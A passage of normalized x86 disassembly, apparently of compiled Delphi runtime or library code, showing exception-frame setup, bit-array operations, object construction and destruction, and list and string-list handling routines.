mov eax [ ebp - 0x4 ]
call sub_4310f8
retn
sub_4310a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431088
xor eax eax
push ebp
push sub_4310ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx ebx
mov edx esi
call sub_4307b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4310f3
mov eax [ ebp - 0x4 ]
call sub_4310f8
retn
sub_431104
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431158
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_431158
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_431134
sar eax 0x5
mov edi eax
add edi edi
add edi edi
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
add ebp ebp
add ebp ebp
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_404204
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_404c14
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_404220
mov edx edi
mov eax ebp
call sub_43114c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4043c8
sub_4311fc
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_431134
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_431158
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_431228
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4312a0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_4355c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4312e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431378
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4054c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
lea edx [ ebp - 0x18 ]
mov eax [ ebx ]
call sub_4054c8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43137f
lea eax [ ebp - 0x18 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4313a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431423
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx ]
call sub_4054c8
mov eax ebx
mov si 0xffff
call sub_40587c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43142a
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax ebx
mov si 0xffff
call sub_40587c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40587c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_407648
sub_431437
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4058d0
mov eax ebx
mov si 0xffff
call sub_40587c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40587c
push eax
lea eax [ ebx + 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
pop eax
call sub_4056b8
sub_431482
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4314b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4314d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4056b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4314fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov edi eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_409cb4
test edi edi
je r-xdata
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax edi
mov si 0xffff
call sub_40587c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_409cb4
mov edx eax
mov eax ebx
call sub_4314fc
test [ edi + 0x1c ] 0x10
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_409cb4
push eax
push r-xdata
push edi
mov eax [ edi ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4315a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4315f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov edx eax
mov eax edi
call sub_4314fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315fc
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_431604
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43163c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43166c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4316bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43173d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx ]
call sub_4054c8
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40587c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
mov eax ebx
call sub_431690
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_4129f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431744
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
sub_431753
inc [ esi ]
add [ eax ] al
add [ 0x5b007300 ] ah
add [ 0x5d006400 ] ah
add [ eax ] al
add [ eax ] al
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_431d44
mov edx ebx
mov eax esi
call sub_431cdc
sub_43179c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_431690
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4306f4
mov dl 0x1
mov eax ebx
call sub_43166c
sub_4317cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_431838
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4315a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_431884
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4315a0
mov eax [ esi + 0x8 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
mov eax esi
call sub_4319ac
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4318d0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4318f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43197f
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
mov edi [ ebx + 0x8 ]
test edi edi
jg r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 4 - 0x4 ]
call sub_4055f0
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov edx edi
call sub_4305a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4318d0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_4319ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_431a08
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
mov esi [ ebx + 0x8 ]
test esi esi
jg r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 - 0x4 ]
call sub_4055f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_431a20
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4305a0
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_431a7c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_431aa4
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_431ab8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431b4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx ]
call sub_4054c8
mov eax ebx
mov si 0xffff
call sub_40587c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b52
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax ebx
mov si 0xffff
call sub_40587c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40587c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_431b6c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_407648
sub_431b6c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431caf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_4070a8
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_40587c
mov edi eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
test edi edi
jne r-xdata
test al al
jne r-xdata
mov eax [ edi ]
add eax 0xffffffb8
cmp [ eax ] 0x0
sete al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431cb6
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
mov eax [ edi ]
add eax 0xffffffb8
mov eax [ eax ]
call sub_422f98
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
add eax eax
add eax eax
call sub_404204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431c84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
add eax 0xffffffb8
mov eax [ eax ]
mov edx [ ebp - 0xc ]
call sub_423338
movsx esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404220
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax edi
call sub_4233bc
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
lea edx [ ebp - 0x14 ]
call sub_422f48
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
add eax 0x14
call sub_4070a8
sub_431cc0
push ebx
push esi
mov esi edx
call sub_4318d0
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_431cdc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40580c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4303e0
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_43199c
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4315a0
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_4304dc
sub_431d44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4306d0
cmp esi eax
jne r-xdata
mov edx esi
xor ecx ecx
mov eax [ ebx + 0x8 ]
call sub_4307b0
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_430438
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4315a0
mov eax ebx
call sub_43199c
pop edi
pop esi
pop ebx
retn
sub_431db0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4305a0
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4305a0
call sub_4055f0
pop edi
pop esi
pop ebx
retn
sub_431df4
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_431e18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_431e74
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_431e90
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_432f08
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_431ec0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_431ee4
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_431f14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431fbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_432088
xor eax eax
push ebp
push sub_431f9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431fa5
mov eax [ ebp - 0x4 ]
call sub_432150
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_431fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_432088
xor eax eax
push ebp
push sub_43206f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
movzx eax [ esi + 0xe ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xe ] ax
movzx eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] ax
movzx eax [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] ax
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ esi + 0x8 ]
call sub_4070a8
movzx eax [ esi + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_432150
retn
sub_4320a0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_432164
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4320f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_432cf4
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push ebp
call sub_4320a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432164
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4321f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432200
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_4068c4
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_407768
jne r-xdata
sub_432210
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_43220c
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
jmp sub_4060b0
sub_432248
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432290
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40a204
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_432210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432297
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4322a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43237b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_432088
xor eax eax
push ebp
push sub_432356
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
